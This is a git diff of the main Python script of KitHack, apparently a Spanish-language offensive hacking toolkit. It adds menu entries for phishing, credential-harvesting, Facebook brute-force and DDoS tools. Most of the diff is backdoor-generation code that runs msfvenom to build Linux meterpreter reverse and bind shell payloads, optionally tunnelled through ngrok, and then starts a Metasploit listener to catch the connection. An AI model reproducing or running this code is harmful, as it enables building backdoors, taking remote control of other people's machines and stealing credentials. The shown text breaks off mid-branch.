@@ -1,6 +1,6 @@
 #!/usr/bin/env python 
 # -*- coding: utf-8 -*-
-#Copyright 2019 KITHACK
+#Copyright 2020 KITHACK
 #Written by: Adrian Guillermo
 #Facebook: https://facebook.com/adrian.guillermo.22
 #Github: https://github.com/AdrMXR
@@ -12,7 +12,6 @@ import urllib
 import os 
 import time
 import Tkinter, Tkconstants, tkFileDialog
-import argparse
 from sys import exit 
 from getch import pause 
 from Tkinter import *
@@ -34,11 +33,11 @@ def check(host='https://www.google.com'):
 
 def info():
 	os.system('clear')
-	print("{0}[VERSION]:{1} 1.0.1\n\n").format(RED, DEFAULT)
+	print("{0}[VERSION]:{1} 1.2.0\n\n").format(RED, DEFAULT)
 	time.sleep(0.5)
 	print("{0}[AUTOR]:{1} ADRIAN GUILLERMO\n\n").format(RED, DEFAULT)
 	time.sleep(0.5)
-	print("{0}[GITHUB]:{1} https://www.GitHub.com/AdrMXR\n\n").format(RED, DEFAULT)
+	print("{0}[GITHUB]:{1} https://www.github.com/AdrMXR\n\n").format(RED, DEFAULT)
 	time.sleep(0.5)
 	print("{0}[FACEBOOK]:{1} https://www.facebook.com/Adrian.Guillermo.22\n\n").format(RED, DEFAULT)
 	time.sleep(0.5)
@@ -60,7 +59,7 @@ def banner():
 	print '{}| $$\  $$   | $$     | $$         | $$  | $$| $$  | $$| $$    $$| $$\  $$  '.format(RED).center(93)
 	print '{}| $$ \  $$ /$$$$$$   | $$         | $$  | $$| $$  | $$|  $$$$$$/| $$ \  $$ '.format(RED).center(93)
 	print '{}|__/  \__/|______/   |__/         |__/  |__/|__/  |__/ \______/ |__/  \__/ '.format(RED).center(93)
-	print '{}                                                                      v1.0.1 by:AdrMXR'.format(BOLD)
+	print '{}                                                                      v1.2.0 by:AdrMXR'.format(BOLD)
                     														
 
 def menu():
@@ -224,7 +223,7 @@ def options():
 
 	elif option == 3:
 		os.system('clear')
-		print '======={0}Tool{1}==============================={0}Information{1}============================='.format(GREEN, DEFAULT)
+		print '======={0}Tool{1}======================================={0}Information{1}====================================='.format(GREEN, DEFAULT)
 		print '{0}01){1} HiddenEye    {2}Herramienta de phishing moderna con funcionalidad avanzada.'.format(WHITE, YELLOW, DEFAULT)
 		print '{0}02){1} PhishX       {2}Generador de phishing y spoofing.'.format(WHITE, YELLOW, DEFAULT)
 		print '{0}03){1} SocialPhish  {2}Herramienta phishing con 32 plantillas + 1 personalizable.'.format(WHITE, YELLOW, DEFAULT)
@@ -235,6 +234,8 @@ def options():
 		print '{0}08){1} Blackeye     {2}Herramienta de phishing con 38 sitios web disponibles.'.format(WHITE, YELLOW, DEFAULT)		
 		print '{0}09){1} PhEmail      {2}Automatiza procesos de envío de correos electrónicos de phishing.'.format(WHITE, YELLOW, DEFAULT)		
 		print '{0}10){1} Weeman       {2}Servidor HTTP para phishing.'.format(WHITE, YELLOW, DEFAULT)				
+		print '{0}11){1} Zphisher     {2}Herramienta de phishing automatizada.'.format(WHITE, YELLOW, DEFAULT)				
+		print '{0}12){1} Lockphish    {2}Obtiene mediante phishing credenciales de Windows, PIN de Android y contraseña de iPhone.'.format(WHITE, YELLOW, DEFAULT)				
 		print '{0} 0){1} Back'.format(WHITE, YELLOW)
 
 		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
@@ -273,6 +274,12 @@ def options():
 		elif tool == 10:
 			kitools.Weeman()
 
+		elif tool == 11:
+			kitools.Zphisher()
+
+		elif tool == 12:
+			kitools.Lockphish()
+
 		else:
 			print("\n{}[X] OPCION INVALIDA".format(RED))
 			time.sleep(1.5)
@@ -301,7 +308,7 @@ def options():
 		print '{0}17){1} Wirespy        {2}Permite configurar honeypots rápidos para llevar a cabo MITMA.'.format(WHITE, YELLOW, DEFAULT)						
 		print '{0}18){1} Wireshark      {2}Analizador de redes que te permite capturar y navegar en el trafico de una red.'.format(WHITE, YELLOW, DEFAULT)						
 		print '{0}19){1} SniffAir       {2}Framework para pentesting inalámbrico.'.format(WHITE, YELLOW, DEFAULT)						
-		print '{0}20){1} WifiJammer     {2}Atasca continuamente todos los clientes / enrutadores wifi.'.format(WHITE, YELLOW, DEFAULT)						
+		print '{0}20){1} WifiJammer     {2}Atasca continuamente todos los clientes/enrutadores wifi.'.format(WHITE, YELLOW, DEFAULT)						
 		print '{0} 0){1} Back'.format(WHITE, YELLOW)
 
 		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT)) 
@@ -389,6 +396,8 @@ def options():
 		print '{0}08){1} John The Ripper {2}Programa que aplica fuerza bruta para descifrar contraseñas.'.format(WHITE, YELLOW, DEFAULT)		
 		print '{0}09){1} Hashcat         {2}Herramienta para la recuperación de contraseñas.'.format(WHITE, YELLOW, DEFAULT)				
 		print '{0}10){1} Brutedum        {2}Ataca SSH, FTP, Telnet, PostgreSQL, RDP, VNC con Hydra, Medusa y Ncrack.'.format(WHITE, YELLOW, DEFAULT)				
+		print '{0}11){1} Facebash        {2}Ataque de fuerza bruta para facebook en shellscript usando TOR.'.format(WHITE, YELLOW, DEFAULT)				
+		print '{0}12){1} Brutespray      {2}Automatiza el escaneo de puertos y realiza ataques por fuerza bruta.'.format(WHITE, YELLOW, DEFAULT)				
 		print '{0} 0){1} Back'.format(WHITE, YELLOW)
 
 		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
@@ -426,6 +435,12 @@ def options():
 
 		elif tool == 10:
 			kitools.Brutedum()
+
+		elif tool == 11:
+			kitools.Facebash()
+
+		elif tool == 12:
+			kitools.Brutespray()
 
 		else:
 			print("\n{}[X] OPCION INVALIDA".format(RED))
@@ -513,9 +528,8 @@ def options():
 		print '{0}02){1} Ip_spoofing   {2}ARP spoofing, HTTP spoofing && Dos.'.format(WHITE, YELLOW, DEFAULT)
 		print '{0}03){1} Arpspoof      {2}Ataque de falsificación de ARP utilizando sockets del kernel de Linux.'.format(WHITE, YELLOW, DEFAULT)
 		print '{0}04){1} DerpNSpoof    {2}Herramienta de suplantación de DNS simple.'.format(WHITE, YELLOW, DEFAULT)
-		print '{0}05){1} Email-spoof   {2}Email Spoofing a traves de una consola bash y un servidor http.'.format(WHITE, YELLOW, DEFAULT)
-		print '{0}06){1} DrSpoof       {2}Herramienta para detectar y detener ataques ARP Spoofing en su red local.'.format(WHITE, YELLOW, DEFAULT)
-		print '{0}07){1} Smslistattack {2}Programa para anonimizar textos de spam, objetivos o listas de objetivos.'.format(WHITE, YELLOW, DEFAULT)
+		print '{0}05){1} DrSpoof       {2}Herramienta para detectar y detener ataques ARP Spoofing en su red local.'.format(WHITE, YELLOW, DEFAULT)
+		print '{0}06){1} Smslistattack {2}Programa para anonimizar textos de spam, objetivos o listas de objetivos.'.format(WHITE, YELLOW, DEFAULT)
 		print '{0} 0){1} Back'.format(WHITE, YELLOW)
 
 		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
@@ -537,12 +551,9 @@ def options():
 			kitools.DerpNSpoof()
 
 		elif tool == 5:
-			kitools.EmailSpoof()
-
-		elif tool == 6:
 			kitools.DrSpoof()
 
-		elif tool == 7:
+		elif tool == 6:
 			kitools.Smslistattack()
 
 		else:
@@ -674,6 +685,9 @@ def options():
 		print '{0}21){1} ZLogger                 {2}Keylogger remoto persistente para Windows y Linux.'.format(WHITE, YELLOW, DEFAULT)
 		print '{0}22){1} Xerosploit              {2}Kit de herramientas de pruebas de penetración.'.format(WHITE, YELLOW, DEFAULT)
 		print '{0}23){1} Slacksec                {2}Kit basico de herramientas hacking.'.format(WHITE, YELLOW, DEFAULT)
+		print '{0}24){1} Katana-Framework        {2}Unifica distintas herramientas funcionales para pruebas de penetración.'.format(WHITE, YELLOW, DEFAULT)
+		print '{0}25){1} Sayhello                {2}Captura audio del objetivo usando un enlace.'.format(WHITE, YELLOW, DEFAULT)
+		print '{0}26){1} Ddostor                 {2}DDoS con herramienta Multi-tor y Torshammer.'.format(WHITE, YELLOW, DEFAULT)
 		print '{0} 0){1} Back'.format(WHITE, YELLOW)	
 
 		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
@@ -751,6 +765,15 @@ def options():
 		elif tool == 23:
 			kitools.Slacksec()
 
+		elif tool == 24:
+			kitools.Katana()
+
+		elif tool == 25:
+			kitools.Sayhello()
+
+		elif tool == 26:
+			kitools.DdosTor()
+
 		else:
 			print("\n{}[X] OPCION INVALIDA".format(RED))
 			time.sleep(1.5)
@@ -786,284 +809,412 @@ def options():
 			print '{0}[01]{1} linux/x64/meterpreter_reverse_http'.format(WHITE, YELLOW)
 			print '{0}[02]{1} linux/x64/meterpreter_reverse_https'.format(WHITE, YELLOW)
 			print '{0}[03]{1} linux/x64/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
-			print '{0}[04]{1} linux/x64/shell_bind_tcp'.format(WHITE, YELLOW)
-			print '{0}[05]{1} linux/x64/shell_reverse_tcp'.format(WHITE, YELLOW)
-			print '{0}[06]{1} linux/x86/meterpreter_reverse_http'.format(WHITE, YELLOW)
-			print '{0}[07]{1} linux/x86/meterpreter_reverse_https'.format(WHITE, YELLOW)
-			print '{0}[08]{1} linux/x86/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
-			print '{0}[09]{1} linux/x86/shell_bind_tcp'.format(WHITE, YELLOW)
-			print '{0}[10]{1} linux/x86/shell_reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[04]{1} linux/x64/meterpreter/reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[05]{1} linux/x64/shell_bind_tcp'.format(WHITE, YELLOW)
+			print '{0}[06]{1} linux/x64/shell_reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[07]{1} linux/x86/meterpreter_reverse_http'.format(WHITE, YELLOW)
+			print '{0}[08]{1} linux/x86/meterpreter_reverse_https'.format(WHITE, YELLOW)
+			print '{0}[09]{1} linux/x86/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[10]{1} linux/x86/meterpreter/reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[11]{1} linux/x86/shell_bind_tcp'.format(WHITE, YELLOW)
+			print '{0}[12]{1} linux/x86/shell_reverse_tcp'.format(WHITE, YELLOW)
 
 			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
 			
 			if pay == 1:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p linux/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))
+				os.system('service postgresql start && msfvenom -p linux/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
-					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+					else:						
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter_reverse_http; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 2:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p linux/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))
+				os.system('service postgresql start && msfvenom -p linux/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
 				location = os.getcwd()	
-				print("\033[1;32m")
-				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter_reverse_https; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()			
 
 			elif pay == 3:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))
+				os.system('service postgresql start && msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 4:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p linux/x64/shell_bind_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))
+				os.system('service postgresql start && msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/shell_bind_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter/reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 5:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p linux/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))
-				location = os.getcwd()	
-				print("\033[1;32m")
-				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				os.system('service postgresql start && msfvenom -p linux/x64/shell_bind_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
+				location = os.getcwd()
+				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/shell_bind_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/shell_bind_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			elif pay == 6:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p linux/x86/meterpreter_reverse_http LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, OUT))	
-				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.elf'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.elf".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				os.system('service postgresql start && msfvenom -p linux/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
+				location = os.getcwd()	
+				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/shell_reverse_tcp; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()		
 				else:
